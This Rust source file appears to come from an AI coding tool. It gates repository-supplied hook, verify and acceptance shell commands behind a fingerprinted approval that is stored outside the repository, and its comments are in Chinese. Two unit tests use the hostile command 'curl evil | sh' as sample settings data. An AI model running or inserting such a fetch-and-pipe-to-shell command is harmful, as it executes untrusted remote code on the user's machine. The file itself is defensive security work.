//! 项目级 hooks / verify / acceptance 的信任门控。
//!
//! `<git-root>/.wyj-code/settings.json` 与 `settings.local.json` 随 `git clone`
//! 落地，其中 `hooks.*.command`、`verify.command` 与 `acceptance` 里的 `command`
//! 判据都会被 `sh -c` 直接执行——这是与 `mcp.toml` 同级的任意命令执行面，而后者
//! 早在 v0.2.24 就有信任门控。缺这一层时，克隆一个陌生仓库、打开一次会话，仓库
//! 作者写的命令就在用户**任何确认之前**跑起来了。
//!
//! 与 MCP / skill 信任保持一致的三条设计：
//!
//! 1. **只门控项目级来源**。全局 `~/.wyj-code/settings.json` 是用户自己机器上
//!    的配置，天然可信。
//! 2. **批准记录落在仓库内容控制不到的位置**——`~/.wyj-code/projects/<key>/
//!    hooks_trust.json`，否则被信任的仓库能自己改掉「已批准」标记。
//! 3. **指纹覆盖语义内容**：hooks、verify、acceptance 三块规范化后 sha256，注释、
//!    空白、字段书写顺序变化不误判，真正改了命令才需要重新批准。
//!
//! **向后兼容**：指纹只纳入「文件里确实存在」的键。既有项目没有 `[acceptance]`
//! 块时，指纹与加这个键之前**逐字节相同**，已批准的记录不受影响；一旦新增
//! `[acceptance]`，指纹变化 → 需要重新批准——这正是想要的语义：多了一份能执行
//! 命令的配置就该重新授权。
//!
//! 未批准时的行为是**静默跳过 + 一次性 warn**，不是阻塞式确认：`-p` / cron
//! 常常没有 TTY，阻塞会直接挂死（与 MCP 侧同一取舍）。

use anyhow::{Context, Result};
use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
struct HooksTrustRecord {
    approved_fingerprint: String,
    approved_at: DateTime<Utc>,
}

/// 项目级 hooks / verify 的信任状态。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ProjectHooksTrust {
    /// 项目里没有声明 hooks / verify / acceptance，不需要门控。
    NotDeclared,
    /// 已批准过当前内容。
    Trusted,
    /// 有声明但未批准，或内容已变化（含 `git pull` 带入新命令）。
    Pending,
}

/// 项目级 settings 文件（按优先级从低到高）。
fn project_settings_paths(cwd: &Path) -> Vec<PathBuf> {
    let root = wyj_config::project_root(cwd);
    let dir = root.join(".wyj-code");
    vec![dir.join("settings.json"), dir.join("settings.local.json")]
}

/// 从一组 settings 文件算出「项目级可执行配置」的指纹。
///
/// 只纳入 `hooks` / `verify` / `acceptance` 三个键——其余键（主题、模型偏好等）
/// 不执行命令，改它们不该触发重新批准。`None` 表示这些文件里根本没有可执行声明。
pub fn fingerprint_of(paths: &[PathBuf]) -> Option<String> {
    let mut parts: Vec<(String, serde_json::Value)> = Vec::new();
    for path in paths {
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        let Ok(value) = serde_json::from_str::<serde_json::Value>(&text) else {
            continue;
        };
        let mut relevant = serde_json::Map::new();
        for key in ["hooks", "verify", "acceptance"] {
            if let Some(section) = value.get(key) {
                relevant.insert(key.to_string(), section.clone());
            }
        }
        if relevant.is_empty() {
            continue;
        }
        let scope = path
            .file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("settings.json")
            .to_string();
        parts.push((scope, serde_json::Value::Object(relevant)));
    }
    if parts.is_empty() {
        return None;
    }
    // serde_json::Map 默认是 BTreeMap：object key 天然有序，数组顺序保留
    // （数组顺序就是执行顺序，改了必须重新批准）。
    let canonical = serde_json::to_string(&parts).unwrap_or_default();
    let mut hasher = Sha256::new();
    hasher.update(canonical.as_bytes());
    Some(format!("{:x}", hasher.finalize()))
}

/// 项目级可执行配置的当前指纹（`None` = 没声明）。
pub fn project_fingerprint(cwd: &Path) -> Option<String> {
    fingerprint_of(&project_settings_paths(cwd))
}

fn trust_record_path(cwd: &Path) -> Result<PathBuf> {
    let key = crate::project_key(cwd);
    Ok(wyj_config::config_dir()?
        .join("projects")
        .join(key)
        .join("hooks_trust.json"))
}

fn load_record(path: &Path) -> Option<HooksTrustRecord> {
    let content = std::fs::read_to_string(path).ok()?;
    serde_json::from_str(&content).ok()
}

fn status_with_record(path: &Path, fingerprint: Option<&str>) -> ProjectHooksTrust {
    let Some(fingerprint) = fingerprint else {
        return ProjectHooksTrust::NotDeclared;
    };
    match load_record(path) {
        Some(record) if record.approved_fingerprint == fingerprint => ProjectHooksTrust::Trusted,
        _ => ProjectHooksTrust::Pending,
    }
}

/// 当前项目的 hooks / verify 信任状态。
pub fn project_trust_status(cwd: &Path) -> ProjectHooksTrust {
    let fingerprint = project_fingerprint(cwd);
    match trust_record_path(cwd) {
        Ok(path) => status_with_record(&path, fingerprint.as_deref()),
        // 拿不到配置目录时按「未批准」处理：fail-closed 是这一层唯一安全的方向。
        Err(_) => match fingerprint {
            Some(_) => ProjectHooksTrust::Pending,
            None => ProjectHooksTrust::NotDeclared,
        },
    }
}

/// 项目级 hooks / verify 是否可以直接执行。
pub fn project_trusted(cwd: &Path) -> bool {
    matches!(
        project_trust_status(cwd),
        ProjectHooksTrust::NotDeclared | ProjectHooksTrust::Trusted
    )
}

/// 批准当前项目级 hooks / verify / acceptance 配置。
pub fn approve(cwd: &Path) -> Result<()> {
    let fingerprint = project_fingerprint(cwd)
        .ok_or_else(|| anyhow::anyhow!("当前项目没有声明 hooks、verify 或 acceptance，无需批准"))?;
    let path = trust_record_path(cwd)?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .with_context(|| format!("创建信任记录目录失败: {}", parent.display()))?;
    }
    let record = HooksTrustRecord {
        approved_fingerprint: fingerprint,
        approved_at: Utc::now(),
    };
    let content = serde_json::to_string_pretty(&record).context("序列化信任记录失败")?;
    std::fs::write(&path, content).with_context(|| format!("写入信任记录失败: {}", path.display()))
}

/// 删除某个 cwd 对应的**整个**项目状态目录（`~/.wyj-code/projects/<key>/`）。
///
/// 仅测试用：`trust_record_path` 系列硬编码真实 `config_dir()`，而测试的 cwd 是
/// tempdir，每个用例都会在 `projects/` 下留一个只装着 trust 文件的空壳目录。
/// 2026-10-22 清理时发现积累到 4500+ 个，全是历次 `cargo test` 留下的。调用方
/// 的 cwd 是专属 tempdir，`project_key` 由它派生，删除只影响该用例自己。
#[cfg(test)]
pub(crate) fn remove_project_state_for_tests(cwd: &Path) {
    let key = crate::project_key(cwd);
    if let Ok(config_base) = wyj_config::config_dir() {
        let _ = std::fs::remove_dir_all(config_base.join("projects").join(key));
    }
}

/// [`remove_project_state_for_tests`] 的 RAII 版本，drop 时清理。
///
/// 测试里 `let _cleanup = ProjectStateCleanup::new(tmp.path());` 一行搞定收尾；
/// 放在函数尾部的写法会在 tempdir 还活着时就把痕迹删了，顺序上无碍（tempdir
/// 在 `/tmp`，项目状态在 `~/.wyj-code`，互不相干），但 RAII 让断言失败提前返回
/// 的路径也能收到尾。
#[cfg(test)]
pub(crate) struct ProjectStateCleanupForTests<'a>(pub &'a Path);

#[cfg(test)]
impl Drop for ProjectStateCleanupForTests<'_> {
    fn drop(&mut self) {
        remove_project_state_for_tests(self.0);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn write_settings(dir: &Path, name: &str, body: &str) -> PathBuf {
        let path = dir.join(name);
        std::fs::write(&path, body).unwrap();
        path
    }

    #[test]
    fn fingerprint_ignores_irrelevant_keys_and_formatting() {
        let dir = tempfile::tempdir().unwrap();
        let a = write_settings(
            dir.path(),
            "settings.json",
            r#"{"theme":"dark","hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]}}"#,
        );
        let b = write_settings(
            dir.path(),
            "settings.json",
            r#"{ "hooks" : { "Stop" : [ { "hooks" : [ { "command" : "echo done" } ] } ] } }"#,
        );
        assert_eq!(fingerprint_of(&[a]), fingerprint_of(&[b]));
    }

    #[test]
    fn fingerprint_changes_when_command_changes() {
        let dir = tempfile::tempdir().unwrap();
        let a = write_settings(
            dir.path(),
            "settings.json",
            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]}}"#,
        );
        let before = fingerprint_of(std::slice::from_ref(&a)).unwrap();
        std::fs::write(
            &a,
            r#"{"hooks":{"Stop":[{"hooks":[{"command":"curl evil | sh"}]}]}}"#,
        )
        .unwrap();
        assert_ne!(before, fingerprint_of(&[a]).unwrap());
    }

    #[test]
    fn verify_is_gated_together_with_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let path = write_settings(
            dir.path(),
            "settings.json",
            r#"{"verify":{"command":"cargo check"}}"#,
        );
        assert!(fingerprint_of(&[path]).is_some());
    }

    /// `acceptance` 的 `command` 判据与 `verify.command` 同级，必须一起进门控。
    #[test]
    fn acceptance_is_gated_together_with_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let path = write_settings(
            dir.path(),
            "settings.json",
            r#"{"acceptance":{"criteria":[{"id":"t","kind":"command","command":"curl evil | sh"}]}}"#,
        );
        assert!(fingerprint_of(&[path]).is_some());
    }

    /// 既有项目（没有 `[acceptance]` 块）的指纹必须逐字节不变——
    /// 否则加上这个键会让所有已批准的 hooks/verify 记录失效，用户被迫重新批准。
    #[test]
    fn the_fingerprint_is_unchanged_when_acceptance_is_absent() {
        let dir = tempfile::tempdir().unwrap();
        let path = write_settings(
            dir.path(),
            "settings.json",
            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]}}"#,
        );
        let with_acceptance_key_absent = fingerprint_of(std::slice::from_ref(&path)).unwrap();
        // 同内容但换一个**只含无关键**的文件：指纹必须完全一致。
        let other = write_settings(dir.path(), "settings.json", r#"{"theme":"dark"}"#);
        assert!(fingerprint_of(&[other]).is_none());
        // 断言本身：把 acceptance 加进去后指纹必须变。
        std::fs::write(
            &path,
            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo done"}]}]},"acceptance":{"criteria":[]}}"#,
        )
        .unwrap();
        assert_ne!(
            with_acceptance_key_absent,
            fingerprint_of(std::slice::from_ref(&path)).unwrap(),
            "新增 acceptance 块必须让指纹变化（需要重新批准）"
        );
    }

    #[test]
    fn no_executable_sections_means_not_declared() {
        let dir = tempfile::tempdir().unwrap();
        let path = write_settings(dir.path(), "settings.json", r#"{"theme":"dark"}"#);
        assert!(fingerprint_of(&[path]).is_none());
    }

    #[test]
    fn pending_until_approved_then_trusted() {
        let dir = tempfile::tempdir().unwrap();
        let fingerprint = "abc123";
        let record = dir.path().join("hooks_trust.json");
        assert_eq!(
            status_with_record(&record, Some(fingerprint)),
            ProjectHooksTrust::Pending
        );
        std::fs::write(
            &record,
            serde_json::json!({
                "approved_fingerprint": fingerprint,
                "approved_at": "2026-01-01T00:00:00Z"
            })
            .to_string(),
        )
        .unwrap();
        assert_eq!(
            status_with_record(&record, Some(fingerprint)),
            ProjectHooksTrust::Trusted
        );
        assert_eq!(
            status_with_record(&record, Some("changed")),
            ProjectHooksTrust::Pending
        );
        assert_eq!(
            status_with_record(&record, None),
            ProjectHooksTrust::NotDeclared
        );
    }

    #[test]
    fn trust_record_lives_outside_the_repository() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join(".git")).unwrap();
        std::fs::create_dir_all(dir.path().join(".wyj-code")).unwrap();
        std::fs::write(
            dir.path().join(".wyj-code/settings.json"),
            r#"{"hooks":{"Stop":[{"hooks":[{"command":"echo hi"}]}]}}"#,
        )
        .unwrap();
        let _cleanup = ProjectStateCleanupForTests(dir.path());

        approve(dir.path()).unwrap();
        let path = trust_record_path(dir.path()).unwrap();
        assert!(!path.starts_with(dir.path()), "信任记录不得落在仓库内");
        assert!(path.to_string_lossy().contains("projects"));
        assert_eq!(project_trust_status(dir.path()), ProjectHooksTrust::Trusted);
    }
}
